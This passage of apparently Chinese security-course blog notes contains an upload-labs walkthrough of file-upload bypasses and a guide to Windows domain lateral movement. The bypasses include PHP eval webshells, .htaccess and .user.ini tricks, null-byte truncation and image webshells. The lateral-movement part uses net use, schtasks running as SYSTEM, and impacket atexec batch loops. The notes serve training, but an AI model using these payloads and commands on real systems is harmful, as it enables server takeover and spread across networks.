<p><img src="/../../images/xdwjsc/1629185892129-4f7acd95-2c0c-4427-bad2-fd592fbe2be8.png" alt="img"></p>
<p>修改uid为3</p>
<p><img src="/../../images/xdwjsc/1629185923737-3d8051e9-df77-407a-a77b-16508beb611a.png" alt="img"></p>
<p>上传时可能出现404，再上传一次上传成功</p>
<p><img src="/../../images/xdwjsc/1629186008834-6d52113f-af75-4cac-b950-ed610c565b71.png" alt="img"></p>
<p>执行成功</p>
<p><img src="/../../images/xdwjsc/1629186097055-ddc33f34-75e4-44b3-bfe6-2f2139c292de.png" alt="img"></p>
<p>weblogic任意文件上传漏洞</p>
<p>启动靶场环境，获取账号密码</p>
<p><img src="/../../images/xdwjsc/1629186608304-df88f8f3-79ab-484f-85e3-14d2f24cbcff.png" alt="img"></p>
<p>打开本地IP 7001端口</p>
<p>127.0.0.1:7001&#x2F;console</p>
<p>登录账号密码</p>
<p><img src="/../../images/xdwjsc/1629186702809-6541551f-d90d-46be-86ce-0f5850f1c38b.png" alt="img"></p>
<p>点击base_domin</p>
<p><img src="/../../images/xdwjsc/1629186798883-64f4d8d2-904f-4a28-83d1-c572f5ca97b9.png" alt="img"></p>
<p>点击高级–&gt;勾选”启用web服务测试页”</p>
<p><img src="/../../images/xdwjsc/1629186854350-37bfdc00-4e7b-4c89-8209-efe099bf2ddc.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629186913837-cda9e881-a823-4367-8b9d-0cefe2d3399b.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629186997198-a0a4cca5-8861-48d9-84d9-8cd37f478876.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629187035382-164f1123-678b-418d-b8f7-33b38bb7f47f.png" alt="img"></p>
<p>上传后查看数据包，其中有时间戳</p>
<p><img src="/../../images/xdwjsc/1629187112887-9becb0bf-1fa7-4fe7-916f-d0bc985c4706.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629187133902-0641dc1b-624b-46ba-b574-17d86a809401.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629187265574-4324e364-c988-4a35-ab10-139e4bc29232.png" alt="img"></p>
<p>文件上传成功</p>
<p><img src="/../../images/xdwjsc/1629187281486-7d34556c-ad0b-4062-82c6-e935d76f73e6.png" alt="img"></p>
<h1><span id="四黑白名单绕过">四，<strong>黑白名单绕过</strong></span></h1><p><img src="/../../images/xdwjsc/1650526844382.png" alt="1650526844382"></p>
<h2><span id="pass-1-使用js对不合法图片进行检查前端js">Pass-1 (使用js对不合法图片进行检查[前端js])</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[123123])?&gt;<br>&lt;?php<br>phpinfo();<br>?&gt;<br></code></pre></td></tr></table></figure>



<ol>
<li><p>上传webshell提示不允许上传，限制了上传文件的类型</p>
<p><img src="/../../images/xdwjsc/1650527232392.png" alt="1650527232392"></p>
<p>这时要猜测判断文件后缀的代码是在前端还是后端<br>F12看源码</p>
</li>
</ol>
<p><img src="/../../images/xdwjsc/1650527556710.png" alt="1650527556710"></p>
<p>​    发现是js代码判断的</p>
<p><img src="/../../images/xdwjsc/1650527511488.png" alt="1650527511488"></p>
<ul>
<li><p>方法一：删除部分js代码</p>
<p><img src="/../../images/xdwjsc/1650528801745.png" alt="1650528801745"></p>
</li>
<li><p>方法二： firebug修改前端代码，添加允许上传类型.php</p>
</li>
</ul>
<p><img src="/../../images/xdwjsc/1650528844905.png" alt="1650528844905"></p>
<ul>
<li><p>方法三：</p>
<p>利用burp抓包，先把webshell后缀名改成网站允许上传的格式，在绕过前端验证后，在burp中将数据包格式改为小马原有格式</p>
<p><img src="/../../images/xdwjsc/1650528749401.png" alt="1650528749401"></p>
</li>
</ul>
<h2><span id="pass-2-mime类型">Pass-2  (MIME类型)</span></h2><p>跟Pass1 一样限制了文件上传的类型</p>
<p>不是在js中，而是在服务器端进行了限制</p>
<blockquote>
<p><strong>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准</strong><br><strong>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据</strong><br><strong>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</strong></p>
</blockquote>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650529722352.png" alt="1650529722352"></p>
<ul>
<li>源码解析</li>
</ul>
<p><img src="/../../images/xdwjsc/1646821134815.png" alt="1646821134815"></p>
<ul>
<li><strong>验证代码，这种单一的文件验证是不安全的，上传时只需要修改对应的文件后缀名就可以</strong></li>
</ul>
<p><img src="/../../images/xdwjsc/1646822162417.png" alt="1646822162417"></p>
<ul>
<li>上传成功</li>
</ul>
<p><img src="/../../images/xdwjsc/1650529588209.png" alt="1650529588209"></p>
<h2><span id="pass-3黑名单验证后缀名">Pass-3（黑名单验证[后缀名]）</span></h2><p>直接告诉我们不允许上传的文件后缀名</p>
<p><img src="/../../images/xdwjsc/165053014478761.png" alt="1650530178761"></p>
<p><strong>strrchr</strong></p>
<p><img src="/../../images/xdwjsc/16468326879401.png" alt="1646832687901"></p>
<p><img src="/../../images/xdwjsc/164683276844387.png" alt="1646832768387"></p>
<ul>
<li><strong>上传代码解析</strong></li>
<li><strong>防止有些方法进行绕过</strong></li>
</ul>
<p><img src="/../../images/xdwjsc/164683310448347.png" alt="1646833108347"></p>
<ul>
<li><p><strong>上传PHP其他格式，如PHP5，PHP4，PHTML，上传成功</strong></p>
<p>不过上传成功也是要有一些条件，需要Apache  httpd.conf配置文件，添加php5…添加此条件（默认开启）</p>
<p><img src="/../../images/xdwjsc/1646833879697.png" alt="1646833879697"></p>
</li>
</ul>
<p><img src="/../../images/xdwjsc/1646833754131.png" alt="1646833754131"></p>
<h2><span id="pass-4htaccess解析">Pass-4（.htaccess解析）</span></h2><p>必Pass3还严格</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650531887905.png" alt="1650531887905"></p>
<ul>
<li>绕过方法</li>
</ul>
<blockquote>
<p> <strong>仅存在于Apache中</strong></p>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>通过htaccess来实现上传文件后缀自定义</p>
</blockquote>
<p>创建htaccess文件</p>
<p> <strong>这样所有文件都会当成php来解析</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;FilesMatch &quot;shana&quot;&gt;<br>Sethandler application/x-httpd-php<br>&lt;/FilesMatch &gt;<br></code></pre></td></tr></table></figure>

<p>先上传.htaccess文件，上传成功</p>
<p><img src="/../../images/xdwjsc/1629275392238-76cbaf3c-3f48-467f-8a0d-1f07c21aa50a.png" alt="img"></p>
<p>下载一张后缀名为jpg的图片，把图片名改为shana，即shana.jpg。打开图片，在最后增加一行php代码，然后上传</p>
<p><strong>当然，直接把php小马后缀名改成jpg也可以上传</strong></p>
<p><img src="/../../images/xdwjsc/1629275575960-dfc154fa-64b6-4886-b48b-81b5d885be4a.png" alt="img"></p>
<p>图片中包含的代码显示成功</p>
<p><img src="/../../images/xdwjsc/1629275601034-1d97ad81-1ecc-4eed-bf63-cd007330d2f8.png" alt="img"></p>
<h2><span id="pass-5-大小写绕过黑名单">Pass-5  (大小写绕过黑名单)</span></h2><p><strong>把 .htaccess后缀的给过滤掉了</strong></p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646887836364.png" alt="1646887836364"></p>
<p><img src="/../../images/xdwjsc/1646888081753.png" alt="1646888081753"></p>
<p><strong>方法一：只需要把文件后缀名改成大写的就能过</strong></p>
<p><img src="/../../images/xdwjsc/1646888269489.png" alt="1646888269489"></p>
<p>方法二： <code>.htaccess</code> 被禁用了</p>
<p>但是.ini没禁用</p>
<p>所以可以上传<code>.user.ini</code>文件<br>内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">auto_prepend_file=test.jpg<br></code></pre></td></tr></table></figure>

<p>让所有php文件都“自动”包含<code>test.jpg</code>文件</p>
<h2><span id="pass-6-空格绕过黑名单">Pass-6 (空格绕过黑名单)</span></h2><p><strong>源码分析：</strong>没有发现使用trim()函数</p>
<p><strong>trim()：去除字符串中的空格</strong></p>
<p><img src="/../../images/xdwjsc/1650545901481.png" alt="1650545901481"></p>
<p><strong>原理解析</strong>：在<strong>数据包中加空格是会被接受的</strong>，也就是说，在抓包时，<strong>文件名.php</strong>，我们只需要在写成<strong>php空格</strong>就可以完成绕过操作，但是在<strong>Windows中系统会强制删除后缀名的空格</strong></p>
<p><img src="/../../images/xdwjsc/1650546189170.png" alt="1650546189170"></p>
<h2><span id="pass7点绕过">Pass7（点绕过）</span></h2><p><strong>代码解析：没有对小数点进行过滤</strong></p>
<p><img src="/../../images/xdwjsc/1646889625436.png" alt="1646889625436"></p>
<p><strong>1.txt 和 1.txt.  两者是一个文件，是一样的， . 和空格是一码事</strong></p>
<p><img src="/../../images/xdwjsc/1646889560214.png" alt="1646889560214"></p>
<p><strong>上传成功</strong></p>
<p><img src="/../../images/xdwjsc/1650546325341.png" alt="1650546325341"></p>
<h2><span id="pass8data绕过">Pass8（::$DATA绕过）</span></h2><p>利用Windows特性</p>
<p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></p>
<p><strong>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</strong></p>
<p>查看源码分析，发现少了::$DATA验证</p>
<p><img src="/../../images/xdwjsc/1646889936059.png" alt="1646889936059"></p>
<p><strong>抓包 后缀名加::$DATA即可绕过</strong></p>
<p><img src="/../../images/xdwjsc/1646890024376.png" alt="1646890024376"></p>
<p>上传成功</p>
<p><img src="/../../images/xdwjsc/16468900138570.png" alt="1646890038570"></p>
<h2><span id="pass9-点空格绕过">Pass9 （点空格绕过）</span></h2><p>代码将字符串里的php替换为空 </p>
<p>一次过滤</p>
<p>a.php -&gt; a.</p>
<p>a.pphphp -&gt; a.php   将中间的php过滤掉，还有个php</p>
<p>循环过滤 递归过滤</p>
<p>a.pphphp -&gt; a.    只要有php出现就会一直过滤掉</p>
<p><strong>代码分析：源码中的过滤都是过滤一次，那么多写几个点和空格让他过滤，是不是就完成绕过了呢</strong></p>
<p><img src="/../../images/xdwjsc/1646890915214.png" alt="1646890915214"></p>
<p><img src="/../../images/xdwjsc/1646890811239.png" alt="1646890811239"></p>
<ol>
<li><strong>修改数据为 xxx.php. .(点 空格 点)，上传成功</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1646890962212.png" alt="1646890962212"></p>
<h2><span id="pass10-双后缀名绕过">Pass10 （双后缀名绕过）</span></h2><p>代码分析：将黑名单的后缀名替换为空，但是它也是单次过滤，没有循环过滤，我们只需要把php改成pphp</p>
<p><img src="/../../images/xdwjsc/1646926751786.png" alt="1646926751786"></p>
<ol>
<li><p>正常上传后缀名被过滤掉了<img src="/../../images/xdwjsc/1646926601315.png" alt="1646926601315"></p>
</li>
<li><p>改后缀名，上传成功</p>
<p><img src="/../../images/xdwjsc/1650547805604.png" alt="1650547805604"></p>
</li>
</ol>
<p>3.当然，改其他格式也是可以的，例如，js，asp…</p>
<p><img src="/../../images/xdwjsc/1646927294393.png" alt="1646927294393"></p>
<h2><span id="pass1100截断get">Pass11（%00截断—GET）</span></h2><p><strong>%00截断原理</strong></p>
<p><strong><a href="http://www.xxx.com/1.jpg">www.xxx.com/1.jpg</a></strong></p>
<p><strong><a href="http://www.xxx.com/webshell.php%00.jpg">www.xxx.com/webshell.php%00.jpg</a> &#x3D;&gt; <a href="http://www.xxx.com/1.php">www.xxx.com/1.php</a></strong></p>
<p><strong>%00是被服务器解码为0x00发挥了截断作用</strong></p>
<p><strong>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</strong></p>
<p><strong>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</strong></p>
<p><strong>%00需要PHP版本小于5.3.4，且打开php的配置文件php-ini，</strong></p>
<p><strong>将magic_quotes_gpc设置为Off</strong></p>
<p><strong>代码分析：</strong></p>
<p>都是指定能上传的文件后缀名</p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646932802901.png" alt="1646932802901"></p>
<p><img src="/../../images/xdwjsc/1650598789303.png" alt="1650598789303"></p>
<h2><span id="pass1100截断post">Pass11（%00截断—POST）</span></h2><p>与上一题相比<br>区别是上传方式变成了POST</p>
<p>还是利用00截断<br>但是POST不会像GET对%00进行自动解码<br>需要在十六进制中进行修改</p>
<p><img src="/../../images/xdwjsc/1650627059910.png" alt="1650627059910"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650627101471.png" alt="1650627101471"></p>
<p><img src="/../../images/xdwjsc/1650627388254.png" alt="1650627388254"></p>
<p><strong>成功上传phpinfo</strong></p>
<p><img src="/../../images/xdwjsc/1650627414761.png" alt="1650627414761"></p>
<h1><span id="五-文件上传之内容逻辑数组绕过">五. 文件上传之内容逻辑数组绕过</span></h1><p> <strong>在学习完代码层面中会指定禁止上传得脚本文件，限制文件后缀和基本的绕过黑名单方法，那么如果服务器指定只能上传的文件呢？那么我们就要通过某些漏洞来突破这些限制，从而获取webshell</strong></p>
<h4><span id="1-图片一句话制作方法">1. 图片一句话制作方法：</span></h4><ol>
<li><strong>将shell.php和1.png类容合在一起</strong></li>
</ol>
<p>copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
<p>&#x2F;b：指定以二进制以二进制格式复制，合并文件，用于图像或者声音类文件</p>
<p>&#x2F;a：指定以ascii格式复制，合并文件，用于txt等文本类文件</p>
<p><img src="/../../images/xdwjsc/164705372385h1.png" alt="1647053723851"></p>
<ol start="2">
<li><strong>生成图片马</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1647053782801.png" alt="1647053782801"></p>
<ol start="3">
<li><p><strong>图片马代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php  @ eval($_POST[&#x27;x&#x27;]) ; ?&gt;<br>or<br>&lt;?php phpinfo() ?&gt;<br></code></pre></td></tr></table></figure></li>
</ol>
<h4><span id="2-文件头检测">2. 文件头检测</span></h4><p>文件头检查是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传</p>
<h4><span id="3-文件包含漏洞解析"><strong>3. 文件包含漏洞解析</strong></span></h4><blockquote>
<p><strong>什么是文件包含</strong>：</p>
<pre><code>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 
</code></pre>
</blockquote>
<p>通过get方式把想要包含的文件传递给服务器，当服务器接收到包含的文件时，找到图片地址，运行包含include得脚本，引入图片马，即可出发文件包含漏洞</p>
<p>在PHP中，只要使用include包含的文件，文件只要有php代码， 不管是jpg，png格式，都会按照    php来执行</p>
<p><strong>说白了存在包含漏洞，利用此漏洞可以将存有php代码的jpg图片以php执行</strong></p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E4%25B9%258B%25E5%2586%2585%25E5%25AE%25B9%25E9%2580%25BB%25E8%25BE%2591%25E6%2595%25B0%25E7%25BB%2584%25E7%25BB%2595%25E8%25BF%2587.assets/1647062488328.png" alt="1647062488328"></p>
<h2><span id="pass-13文件头检测图片马利用文件包含漏洞"><strong>Pass-13（文件头检测，图片马利用文件包含漏洞）</strong></span></h2><p>分析代码：代码中存在验证头信息</p>
<p><img src="/../../images/xdwjsc/1647065017758.png" alt="1647065017758"></p>
<p>例如GIF：GIF89a就是GIF的文件头</p>
<p><img src="/../../images/xdwjsc/1647065056247.png" alt="1647065056247"></p>
<ol>
<li>制作图片马</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064202224.png" alt="1647064202224"></p>
<ol start="2">
<li>上传图片马，复制地址</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064368005.png" alt="1647064368005"></p>
<ol start="3">
<li>利用文件包含漏洞，执行图片马中的代码</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064624320.png" alt="1647064624320"></p>
<p><strong>方法二：直接修改脚本后缀名，和文件头</strong></p>
<p><img src="/../../images/xdwjsc/1650630521824.png" alt="1650630521824"></p>
<h2><span id="pass-14-突破getimagesize">Pass-14 （突破getimagesize）</span></h2><p>php  getimagesize()函数：用于获取图像大小及相关信息，只接收图像相当于限制了文件类型，在排除解析漏洞，只能上传图像</p>
<p><img src="/../../images/xdwjsc/1647065297756.png" alt="1647065297756"></p>
<p>利用文件包含漏洞还是可以执行成功图片马</p>
<p><strong>与Pass13类似，此关主要学习了getimagesize作用</strong></p>
<p><img src="/../../images/xdwjsc/1647065509306.png" alt="1647065509306"></p>
<h2><span id="pass-15突破exif-imagetype">Pass-15（突破exif-imagetype）</span></h2><p><strong>分析源码</strong></p>
<p><strong>exif-imagetype：获取图片类型，验证上传图片的真实格式。只接收图像相当于限制了文件类型</strong></p>
<p><img src="/../../images/xdwjsc/1647065688699.png" alt="1647065688699"></p>
<p>利用文件包含漏洞还是可以执行成功图片马</p>
<p><strong>与Pass13类似，此关主要学习了exif-imagetype作用</strong></p>
<p><img src="/../../images/xdwjsc/16470654946897.png" alt="1647065946897"></p>
<p><strong>小结：Pass14&#x2F;15&#x2F;16利用了getimagesize&#x2F;exif-imagetype函数来验证上传的图像信息来判断是不是图像，如果没有文件包含漏洞，那么还是比较安全的</strong></p>
<h2><span id="pass-16-二次渲染绕过">Pass-16 （二次渲染绕过）</span></h2><h4><span id="1-gif绕过">1. GIF绕过</span></h4><p><img src="/../../images/xdwjsc/1650685845267.png" alt="1650685845267"></p>
<ul>
<li>判断了后缀名、content-type</li>
<li>利用imagecreatefromgif判断格式</li>
<li>二次渲染了上传的图片</li>
</ul>
<blockquote>
<p> <strong>绕过方法：找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片</strong> </p>
</blockquote>
<ol>
<li><strong><?php phpinfo(); ?></strong>  添加到gif文件的尾部</li>
</ol>
<p><img src="/../../images/xdwjsc/1650685946083.png" alt="1650685946083"></p>
<p>上传后在下载下来发现二次渲染了</p>
<p><img src="/../../images/xdwjsc/1650685993545.png" alt="1650685993545"></p>
<ol start="2">
<li><strong>关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1650686208435.png" alt="1650686208435"></p>
<ol start="3">
<li><p>上传修改过的图片马</p>
<p><img src="/../../images/xdwjsc/1650686344438.png" alt="1650686344438"></p>
</li>
</ol>
<h4><span id="2-pngjpg绕过">2 .PNG，JPG绕过</span></h4><p>有点麻烦不想写了，参考大佬博客吧</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
<h4><span id="3学习扩展">3.学习扩展</span></h4><p>Pass16参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108847008">CSND思源湖的鱼</a></p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
<p>视频：</p>
<iframe src="//player.bilibili.com/player.html?aid=68451394&bvid=BV1bJ411u77o&cid=118635716&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
------



<iframe src="//player.bilibili.com/player.html?aid=92395475&bvid=BV1dE411n7tE&cid=157740529&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
## Pass-17/18  (条件竞争)

<p>实验环境出了点问题</p>
<p>参开链接</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-17.html">付杰博客</a></p>
<p>B站视频</p>
<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338199976&page=34" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
## Pass-20  (多种方法)

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650787223757.png" alt="1650787223757"></p>
<h2><span id="pass-21-来自ctf">Pass-21  (来自CTF)</span></h2><p>代码中有检查MEMI，将MIME改成图片类型</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650867245630.png" alt="1650867245630"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650866223537.png" alt="1650866223537"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[计划任务impacket]</title>
    <url>/2022/05/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1&amp;impacket%20%5D/</url>
    <content><![CDATA[<h1><span id="域横向atampschtasksampimpacket">域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>







<h1><span id="计划任务at">计划任务——AT</span></h1><p>注：at命令仅仅适用于win8以下系统，win8和win8以上已弃用</p>
<p>1.创建本地IPC链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\192.168.3.21\ipc$ Admin12345 /user:administrator<br></code></pre></td></tr></table></figure>

<p>2.拷贝要执行的命令脚本到目标主机</p>
<p><img src="/../../images/xdnwaq/d1639495713473.png" alt="1639495713473"></p>
<p>3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
<p><img src="/../../images/xdnwaq/16394957436174.png" alt="1639495736174"></p>
<h1><span id="计划任务schtasks">计划任务——schtasks</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#schtasks &gt;=Windows2012<br>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad<br>ministrator # 建立 ipc 连接：<br>copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘<br>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务<br>对应执行文件<br>schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务<br>schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务<br></code></pre></td></tr></table></figure>

<p>1.创建任务</p>
<p>schtasks &#x2F;create &#x2F;s 192.168.1.146 &#x2F;ru “SYSTEM” &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\add.bat &#x2F;F </p>
<p>&#x2F;ru “SYSTEM”                        权限</p>
<p> &#x2F;tn adduser                        计时任务的名字 </p>
<p>&#x2F;sc DAILY &#x2F;tr c:\add.bat     延迟执行文件地址</p>
<p><img src="/../../images/xdnwaq/16394986174427.png" alt="1639498617427"></p>
<p>2.运行adduser 任务</p>
<p>schtasks &#x2F;run &#x2F;s 192.168.3.32 &#x2F;tn adduser &#x2F;i</p>
<p><img src="/../../images/xdnwaq/16394984666812.png" alt="1639498666812"></p>
<p>3.删除add user任务</p>
<p> schtasks &#x2F;delete &#x2F;s 192.168.3.21 &#x2F;tn adduser &#x2F;f#删除 adduser 任务 </p>
<h1><span id="atexec-impacket">atexec-impacket</span></h1><p><strong>atexec.exe [用户名] ：[密码] @ [IP] [命令]</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/16395840214846.png" alt="1639584021846"></p>
<h1><span id="atexecexe批量连接"><strong>atexec.exe批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1651470706485.png" alt="1651470706485"></p>
<h1><span id="net-use批量连接"><strong>net use批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;Admin12345&quot; /user:administrator<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1639590175450.png" alt="1639590175450"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
</search>
